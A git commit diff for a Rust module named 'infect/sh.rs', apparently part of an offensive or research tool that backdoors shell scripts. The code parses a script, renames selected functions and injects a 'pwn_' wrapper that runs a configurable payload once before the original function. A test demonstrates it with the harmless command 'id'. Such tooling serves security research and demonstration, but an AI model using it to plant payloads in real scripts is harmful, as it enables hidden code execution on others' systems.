19739a0d4f7130f4735044a7c5856c7d7d424713
kpcyrd <git@rxv.cc>
2023-01-05 23:21:40 +0100

    Use simpler implementation and avoid unbound variable access

--- src/infect/sh.rs
+++ src/infect/sh.rs
@@ -2,15 +2,9 @@ use crate::args;
 use crate::errors::*;
 use blake2::{Blake2b512, Digest};
 use serde::{Deserialize, Serialize};
-use std::num::NonZeroU64;
 use std::ops::Range;
 use std::str;
 use tokio::io::{AsyncWrite, AsyncWriteExt};
-use yash_syntax::alias::AliasSet;
-use yash_syntax::input::Memory;
-use yash_syntax::parser::lex::Lexer;
-use yash_syntax::parser::Parser;
-use yash_syntax::source::Source;
 use yash_syntax::syntax;
 
 fn hash_script(script: &str) -> String {
@@ -76,52 +70,36 @@ pub async fn infect<W: AsyncWrite + Unpin>(
 
     let hash = hash_script(script);
 
-    // First, prepare an input object that the lexer reads from.
-    let input = Box::new(Memory::new(script));
-
-    // Next, create a lexer.
-    let line = NonZeroU64::new(1).unwrap();
-    let mut lexer = Lexer::new(input, line, Source::Unknown);
-
-    // Then, create a new parser borrowing the lexer.
-    let aliases = AliasSet::new();
-    let mut parser = Parser::new(&mut lexer, &aliases);
+    let parsed: syntax::List = script
+        .parse()
+        .map_err(|err| anyhow!("Failed to parse input as shell script: {:#?}", err))?;
 
     let mut patches = Vec::new();
 
-    loop {
-        let line = parser
-            .command_line()
-            .await
-            .map_err(|err| anyhow!("Failed to parse line in shell script: {:#?}", err))?;
-        let Some(line) = line else { break };
+    for item in &parsed.0 {
+        for cmd in &item.and_or.first.commands {
+            if let syntax::Command::Function(fun) = cmd.as_ref() {
+                let name = fun.name.to_string();
+                if config.should_hook_fn(&name) {
+                    let patched_name = format!("{}_{}", name, hash);
+                    let position = &fun.name.location.range;
+                    let code = fun.body.to_string();
 
-        for item in &line.0 {
-            for cmd in &item.and_or.first.commands {
-                if let syntax::Command::Function(fun) = cmd.as_ref() {
-                    let name = fun.name.to_string();
-                    if config.should_hook_fn(&name) {
-                        let patched_name = format!("{}_{}", name, hash);
-                        // let word = fn_name(&patched_name)?;
-                        let position = &fun.name.location.range;
-                        let code = fun.body.to_string();
+                    let truncated = truncate(&code, 120);
+                    let is_truncated = truncated.len() != code.len();
 
-                        let truncated = truncate(&code, 120);
-                        let is_truncated = truncated.len() != code.len();
-
-                        debug!(
-                            "Found function {:?} at {:?}: {:?}{}",
-                            name,
-                            position,
-                            truncated,
-                            if is_truncated { " (truncated)" } else { "" }
-                        );
-                        patches.push(Patch::Rename {
-                            old: name,
-                            new: patched_name,
-                            position: position.clone(),
-                        });
-                    }
+                    debug!(
+                        "Found function {:?} at {:?}: {:?}{}",
+                        name,
+                        position,
+                        truncated,
+                        if is_truncated { " (truncated)" } else { "" }
+                    );
+                    patches.push(Patch::Rename {
+                        old: name,
+                        new: patched_name,
+                        position: position.clone(),
+                    });
                 }
             }
         }
@@ -156,7 +134,7 @@ pub async fn infect<W: AsyncWrite + Unpin>(
                 if !installed_pwn_function {
                     out.write_all(
                         format!(
-                        "pwn_{hash}() {{ test -n \"$pwned_{hash}\" && return; pwned_{hash}=1; {}; }}\n",
+                        "pwn_{hash}() {{ test -n \"${{pwned_{hash}:-}}\" && return; pwned_{hash}=1; {}; }}\n",
                         config.payload,
                         hash = hash,
                     )
@@ -216,7 +194,7 @@ foo
             script,
             "#!/bin/sh
 echo 1
-pwn_552c23d59a98() { test -n \"$pwned_552c23d59a98\" && return; pwned_552c23d59a98=1; id; }
+pwn_552c23d59a98() { test -n \"${pwned_552c23d59a98:-}\" && return; pwned_552c23d59a98=1; id; }
 foo() { pwn_552c23d59a98; foo_552c23d59a98 \"$@\"; }
 foo_552c23d59a98() {
     echo 3
